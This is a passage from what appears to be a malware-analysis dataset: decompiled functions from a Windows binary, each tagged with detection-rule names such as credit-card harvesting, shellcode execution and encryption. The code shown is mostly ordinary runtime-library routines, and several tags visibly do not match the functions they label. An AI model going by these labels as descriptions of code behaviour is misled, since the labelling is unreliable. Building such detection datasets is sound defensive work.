*arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405bf8)) {\n                case 0x405c10:\n                    goto code_r0x00405c10;\n                case 0x405c20:\n                    goto code_r0x00405c20;\n                case 0x405c34:\n                    goto code_r0x00405c34;\n                }\n                break;\n            case 0x405b30:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00405ad4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405bf8)) {\n                case 0x405c10:\n                    goto code_r0x00405c10;\n                case 0x405c20:\n                    goto code_r0x00405c20;\n                case 0x405c34:\n                    goto code_r0x00405c34;\n                }\n                break;\n            case 0x405b58:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00405ad4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405bf8)) {\n                case 0x405c10:\n                    goto code_r0x00405c10;\n                case 0x405c20:\n                    goto code_r0x00405c20;\n                case 0x405c34:\n                    goto code_r0x00405c34;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0040596c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x405a5c\n        switch(*((arg_10h & 3) * 4 + 0x405a5c)) {\n        case 0x405a74:\ncode_r0x00405a74:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x405a80:\ncode_r0x00405a80:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x405a94:\ncode_r0x00405a94:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x405a6c)) {\n        case 0x405a74:\n            goto code_r0x00405a74;\n        case 0x405a80:\n            goto code_r0x00405a80;\n        case 0x405a94:\n            goto code_r0x00405a94;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x405970)) {\n        case 0x405980:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0040596c:\n    // WARNING: Could not recover jumptable at 0x0040596c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x4059f0\n                puVar1 = (**(uVar2 * 4 + 0x4059f0))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405a5c)) {\n            case 0x405a74:\n                goto code_r0x00405a74;\n            case 0x405a80:\n                goto code_r0x00405a80;\n            case 0x405a94:\n                goto code_r0x00405a94;\n            }\n            break;\n        case 0x4059ac:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0040596c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405a5c)) {\n            case 0x405a74:\n                goto code_r0x00405a74;\n            case 0x405a80:\n                goto code_r0x00405a80;\n            case 0x405a94:\n                goto code_r0x00405a94;\n            }\n            break;\n        case 0x4059d0:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0040596c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405a5c)) {\n            case 0x405a74:\n                goto code_r0x00405a74;\n            case 0x405a80:\n                goto code_r0x00405a80;\n            case 0x405a94:\n                goto code_r0x00405a94;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2695
    },
    "0040828f": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040828f(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    uVar1 = fcn.0040823d();\n    iVar2 = (**0x45d6dc)(uVar1, (-(*0x45d6cc != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar2 == 0) {\n        *0x45d6bc = 0;\n    }\n    else {\n        iVar2 = fcn.004095be(*0x45d6d0, &var_7ch);\n        if ((iVar2 == 0) && (iVar2 = fcn.0040813c(uVar1),  iVar2 != 0)) {\n            *0x45d6bc = *0x45d6bc | 4;\n            *0x45d6c0 = uVar1;\n            *0x45d6c4 = uVar1;\n        }\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 283
    },
    "0040839c": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040839c(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0040823d();\n    iVar1 = (**0x45d6dc)(arg_8h_00, (-(*0x45d6cc != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x45d6bc = 0;\n        goto code_r0x004085ab;\n    }\n    iVar1 = fcn.004095be(*0x45d6d0, &var_7ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x45d6dc)(arg_8h_00, (-(*0x45d6c8 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n        if (iVar1 != 0) {\n            iVar1 = fcn.004095be(*0x45d6d8, &var_7ch);\n            if (iVar1 == 0) {\n                *0x45d6bc = *0x45d6bc | 0x304;\n                *0x45d6c0 = arg_8h_00;\n                *0x45d6c4 = arg_8h_00;\n            }\n            else if ((*0x45d6bc & 2) == 0) {\n                if ((*0x45d6d4 == 0) || (iVar1 = fcn.0040975b(*0x45d6d8, &var_7ch, *0x45d6d4),  iVar1 != 0)) {\n                    if (((*0x45d6bc & 1) == 0) && (iVar1 = fcn.0040813c(arg_8h_00),  iVar1 != 0)) {\n                        *0x45d6bc = *0x45d6bc | 1;\n                        *0x45d6c4 = arg_8h_00;\n                    }\n                }\n                else {\n                    *0x45d6bc = *0x45d6bc | 2;\n                    *0x45d6c4 = arg_8h_00;\n                    iVar1 = fcn.00403df0(*0x45d6d8);\n                    if (iVar1 == *0x45d6d4) {\n                        *0x45d6c0 = arg_8h_00;\n                    }\n                }\n            }\n            goto code_r0x004084c9;\n        }\ncode_r0x004084fd:\n        *0x45d6bc = 0;\n        goto code_r0x004085ab;\n    }\ncode_r0x004084c9:\n    if ((*0x45d6bc & 0x300) == 0x300) goto code_r0x004085ab;\n    iVar1 = (**0x45d6dc)(arg_8h_00, (-(*0x45d6c8 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) goto code_r0x004084fd;\n    iVar1 = fcn.004095be(*0x45d6d8, &var_7ch);\n    if (iVar1 == 0) {\n        *0x45d6bc = *0x45d6bc | 0x200;\n        if (((*0x45d6c8 == 0) && (*0x45d6d4 != 0)) && (iVar1 = fcn.00403df0(*0x45d6d8),  iVar1 == *0x45d6d4)) {\n            arg_ch = 1;\n            goto code_r0x0040857b;\n        }\n    }\n    else {\n        if (((*0x45d6c8 != 0) || (*0x45d6d4 == 0)) ||\n           (iVar1 = fcn.0040975b(*0x45d6d8, &var_7ch, *0x45d6d4),  iVar1 != 0)) goto code_r0x004085ab;\n        arg_ch = 0;\ncode_r0x0040857b:\n        iVar1 = fcn.00408327(arg_8h_00, arg_ch);\n        if (iVar1 == 0) goto code_r0x004085ab;\n    }\n    *0x45d6bc = *0x45d6bc | 0x100;\n    if (*0x45d6c0 == 0) {\n        *0x45d6c0 = arg_8h_00;\n    }\ncode_r0x004085ab:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 1158
    },
    "00408950": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.00408950(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x004089d0;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x004089d0:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x004089d0;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x004089d0;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x00408983;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x004089d0;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x00408983:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x004089d0;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1045
    },
    "0040171e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004017b0: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004017b5)\n// WARNING: Removing unreachable block (ram,0x004017db)\n// WARNING: Removing unreachable block (ram,0x004017ba)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040171e(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004026d8(0x40b988, 8);\n    fcn.004029d8(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x45d390 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x45d38c = 1;\n    *0x45d388 = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x45db68 != NULL) {\n            while( true ) {\n                *0x45db64 = *0x45db64 + -1;\n                if (*0x45db64 < *0x45db68) break;\n                if (**0x45db64 != NULL) {\n                    (***0x45db64)();\n                }\n            }\n        }\n        fcn.0040167e(0x40e020);\n    }\n    fcn.0040167e(0x40e028);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040290b(8);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00405edb": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl\nfcn.00405edb(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t unaff_EBP;\n    char *pcVar5;\n    uint var_8h;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x40c2d8;\n    fcn.004026d8();\n    *(unaff_EBP - 0x1c) = *0x45cca0 ^ unaff_EBP;\n    pcVar2 = *0x45d684;\n    uVar1 = *(unaff_EBP + 0xc);\n    if (*0x45d684 == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar5 = \"Buffer overrun detected!\";\n            *(unaff_EBP - 0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar5 = \"Unknown security failure detected!\";\n            *(unaff_EBP - 0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP - 0x20) = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP - 0x124, 0x104);\n        if (iVar3 == 0) {\n            fcn.00403bc0(unaff_EBP - 0x124, \"<program name unknown>\");\n        }\n        iVar3 = unaff_EBP - 0x124;\n        iVar4 = fcn.00403df0(iVar3);\n        if (0x3c < iVar4 + 0xbU) {\n            iVar3 = fcn.00403df0(iVar3);\n            iVar3 = iVar3 + (unaff_EBP - 0x155);\n            fcn.00403cc0(iVar3, 0x40bd80, 3);\n        }\n        fcn.00403df0(iVar3);\n        fcn.00402830();\n        *(unaff_EBP - 0x18) = &var_18h;\n        fcn.00403bc0(&var_18h, pcVar5);\n        fcn.00403bd0(&var_18h, 0x40bd60);\n        fcn.00403bd0(&var_18h, \"Program: \");\n        fcn.00403bd0(&var_18h, iVar3);\n        fcn.00403bd0(&var_18h, 0x40bd60);\n        fcn.00403bd0(&var_18h, *(unaff_EBP - 0x128));\n        fcn.00403abd(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP - 4) = 0;\n        (*pcVar2)(*(unaff_EBP + 8), uVar1);\n        *(unaff_EBP - 4) = 0xffffffff;\n    }\n    fcn.004017f2(3);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 926
    },
    "00404416": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404416(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40bec8, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.004029d8(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x45d624 = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x45d624 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x45d624 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x45d624 = 1;\n        iVar1 = *0x45d6a0;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x45d7f4;\n    if (iVar1 == *0x45d904) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x45d7f4;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.0040162a(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.00404272(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x45d904;\n                arg_8h_00[2] = *0x45d7f8;\n                arg_8h_00[3] = *0x45d7f0;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x45d910);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x45d800);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x45d7f4 = arg_8h_00,  iVar1 < 0x100; iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x45d920);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x45d7f4)) {\n            fcn.00401512(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040455d();\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 920
    },
    "00401c04": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.00401c04(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x45db6c == 0) {\n        fcn.00404566();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x45d340;\n    if (*0x45d340 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.00403df0(pcVar3);\n        }\n        piVar1 = fcn.0040162a(iVar4 * 4 + 4);\n        pcVar3 = *0x45d340;\n        *0x45d370 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.00401512(*0x45d340);\n                    *0x45d340 = NULL;\n                    *piVar1 = 0;\n                    *0x45db60 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.00403df0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.0040162a(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.00401512(*0x45d370);\n                        *0x45d370 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.00403bc0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 440
    },
    "0040272c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040272c(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.0040565e(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.00405570(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.004055b2(param_2, iVar5);\n                        fcn.00405646(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.004055b2(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 511
    },
    "00402e60": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402e60(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 764
    },
    "00407226": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.00407226(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t uVar45;\n    uint32_t uVar46;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x45d6fe;\n    uVar46 = *0x45d700;\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.0040948e(1, *0x45d6fe, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.0040948e(1, uVar1, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.0040948e(1, uVar1, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.0040948e(1, uVar1, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.0040948e(1, uVar1, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.0040948e(1, uVar1, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.0040948e(1, uVar1, 0x37);\n    uVar9 = fcn.0040948e(1, uVar1, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.0040948e(1, uVar1, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.0040948e(1, uVar1, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.0040948e(1, uVar1, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.0040948e(1, uVar1, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.0040948e(1, uVar1, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.0040948e(1, uVar1, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.0040948e(1, uVar1, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.0040948e(1, uVar1, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.0040948e(1, uVar1, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.0040948e(1, uVar1, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.0040948e(1, uVar1, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.0040948e(1, uVar1, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.0040948e(1, uVar1, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.0040948e(1, uVar1, 0x4b, 